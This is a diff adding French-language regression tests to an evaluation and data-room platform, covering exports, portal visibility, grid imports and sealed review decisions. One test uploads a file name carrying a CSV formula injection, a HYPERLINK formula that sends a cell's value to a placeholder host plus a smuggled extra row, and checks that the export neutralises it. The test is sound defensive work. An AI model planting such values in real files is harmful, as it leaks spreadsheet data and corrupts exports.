@@ -2,6 +2,7 @@
 formules (scoring.py), puis la méthode dans la plateforme (grille étendue, preuves, gates, comités
 scellés, révisions, journal, imports et rapports)."""
 
+import csv
 import io
 import json
 import zipfile
@@ -464,3 +465,111 @@ class TestMethodeDansLaPlateforme(ApiCase):
         response = self.url_open(f"/api/v1/portail/dossiers/{self.dossier.id}/pieces.pdf",
                                  headers={"Authorization": f"Bearer {ptoken}"}, timeout=60)
         self.assertEqual(response.status_code, 200, response.text[:500])
+
+    # ─── Corrections de la revue de code ──────────────────────────────────
+
+    def test_classeur_avec_preuves_datees_et_non_datees(self):
+        evidence = f"/axispro/evaluations/{self.evals['C002'].id}/evidence"
+        self.assertEqual(self._upload(evidence, "titre.pdf", {"validity_date": "2030-12-31"}).status_code, 200)
+        self.assertEqual(self._upload(evidence, "plan_cadastral.pdf").status_code, 200)
+        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/report.xlsx",
+                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
+        self.assertEqual(response.status_code, 200, response.text[:300])
+        self.assertTrue(response.content.startswith(b"PK"))
+
+    def test_sommaire_de_la_data_room_sans_formule(self):
+        response = self._upload(f"/axispro/dossiers/{self.dossier.id}/documents", "libre.pdf",
+                                {"name": '=HYPERLINK("http://exemple.test/?"&B2;"ouvrir")\nFausse ligne;1'})
+        self.assertEqual(response.status_code, 200, response.text)
+        self.assertNotIn("\n", response.json()["name"], "Nom ramené à une ligne")
+        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/dataroom.zip",
+                                 headers={"Authorization": f"Bearer {self.token}"}, timeout=60)
+        summary = zipfile.ZipFile(io.BytesIO(response.content)).read("SOMMAIRE.csv").decode("utf-8-sig")
+        rows = list(csv.reader(io.StringIO(summary), delimiter=";"))
+        self.assertEqual(len(rows), 2, "En-tête et une pièce, sans ligne ajoutée par le nom")
+        self.assertTrue(rows[1][1].startswith("'="), "Formule neutralisée")
+
+    def test_portail_sans_structure_de_la_grille(self):
+        self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf")
+        porteur = self._create_user("porteur.grille", "porteur", company_id=self.cabinet.id,
+                                    company_ids=[(6, 0, self.cabinet.ids)])
+        self.dossier.portal_user_ids = [(4, porteur.id)]
+        ptoken = self.open_session("porteur.grille", app="portail")["access_token"]
+        status, view = self.call("GET", f"/portail/dossiers/{self.dossier.id}", token=ptoken)
+        self.assertEqual(status, 200, view)
+        self.assertTrue(view["documents"])
+        for doc in view["documents"]:
+            self.assertFalse({"criteria", "origin", "available"} & set(doc), doc)
+        status, files = self.call("GET", f"/portail/dossiers/{self.dossier.id}/documents", token=ptoken)
+        self.assertEqual(status, 200, files)
+        self.assertTrue(all("criteria" not in f for f in files), files)
+
+    def test_grille_aux_valeurs_illisibles_refusee(self):
+        head = "type;code;libelle;domaine;gate;poids;critique;eliminatoire;preuve;aide\n"
+        base = "gate;G0;Idée;;;;;;;\ndomaine;D01;Marché;;;1;;;;\n"
+        cases = {
+            "éliminatoire illisible": "critere;C001;Étude;D01;G0;1;non;peut-être;non;\n",
+            "poids négatif": "critere;C001;Étude;D01;G0;-1;non;non;non;\n",
+            "poids illisible": "critere;C001;Étude;D01;G0;2,5 pts;non;non;non;\n",
+            "code en double": "critere;C001;Étude;D01;G0;1;non;non;non;\ncritere;C001;Autre;D01;G0;1;non;non;non;\n",
+            "type inconnu": "criteres;C001;Étude;D01;G0;1;non;non;non;\n",
+        }
+        for label, rows in cases.items():
+            with self.subTest(label), self.assertRaises(UserError):
+                self.env["axispro.policy"].import_grid(self.cabinet, label, "g.csv", (head + base + rows).encode())
+        ok = self.env["axispro.policy"].import_grid(self.cabinet, "Valide", "g.csv",
+                                                    (head + base + "critere;C001;Étude;D01;G0;1;Oui;NON;x;\n").encode())
+        self.assertEqual((ok.criterion_ids.critical, ok.criterion_ids.knockout, ok.criterion_ids.evidence_required),
+                         (True, False, True))
+        ok.go_threshold = 90
+        with self.assertRaises(UserError, msg="APD READY au-dessus de BANKABLE"):
+            ok.action_activate()
+
+    def test_sceau_couvre_les_colonnes_affichees(self):
+        self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf",
+                     {"validity_date": "2030-12-31"})
+        status, review = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
+                                   {"decision": "hold", "lock": True, "motive": "Titre foncier à produire"},
+                                   token=self.token)
+        self.assertEqual(status, 200, review)
+        record = self.env["axispro.review"].browse(review["id"])
+        self.assertTrue(record.verify()["intact"])
+        self.env.cr.execute("UPDATE axispro_review SET decision = 'go' WHERE id = %s", (record.id,))
+        record.invalidate_recordset()
+        self.assertFalse(record.verify()["intact"], "Décision modifiée en base hors du contenu scellé")
+
+    def test_pieces_figees_par_la_decision(self):
+        response = self._upload(f"/axispro/evaluations/{self.evals['C002'].id}/evidence", "titre.pdf",
+                                {"validity_date": "2025-01-31"})
+        before = response.json()["document"]["id"]
+        status, review = self.call("POST", f"/axispro/dossiers/{self.dossier.id}/reviews",
+                                   {"decision": "hold", "lock": True, "motive": "Titre foncier à actualiser"},
+                                   token=self.token)
+        self.assertEqual(status, 200, review)
+        status, body = self.call("PATCH", f"/axispro/documents/{before}", {"validity_date": "2031-01-31"},
+                                 token=self.token)
+        self.assertEqual(status, 422, "Preuve antérieure à la décision : validité figée")
+        response = self._upload(f"/axispro/dossiers/{self.dossier.id}/documents", "complement.pdf")
+        after = response.json()
+        self.assertTrue(after["after_lock"])
+        status, body = self.call("PATCH", f"/axispro/documents/{after['id']}", {"state": "validated"}, token=self.token)
+        self.assertEqual((status, body["state"]), (200, "validated"), body)
+        self.env.invalidate_all()
+        self.assertTrue(self.env["axispro.review"].browse(review["id"]).verify()["intact"])
+
+    def test_capex_non_evalue_sans_anomalie(self):
+        self.dossier.investment = 5_000_000
+        anomalies = " ".join(self.dossier.scoring()["anomalies"])
+        self.assertNotIn("investissement", anomalies, "CAPEX encore à évaluer : rien à signaler")
+        self.evals["C003"].status = "not_met"
+        self.assertIn("investissement", " ".join(self.dossier.scoring()["anomalies"]))
+
+    def test_classeur_reimporte_sans_changement(self):
+        headers = {"Authorization": f"Bearer {self.token}"}
+        response = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/report.xlsx", headers=headers, timeout=60)
+        self.assertEqual(response.status_code, 200)
+        result = self.url_open(f"/api/v1/axispro/dossiers/{self.dossier.id}/evaluation/import",
+                               files={"file": ("classeur.xlsx", io.BytesIO(response.content),
+                                               "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")},
+                               data={"dry_run": "1"}, headers=headers, method="POST", timeout=60).json()
+        self.assertEqual((result["changes"], result["errors"]), ([], []), result)
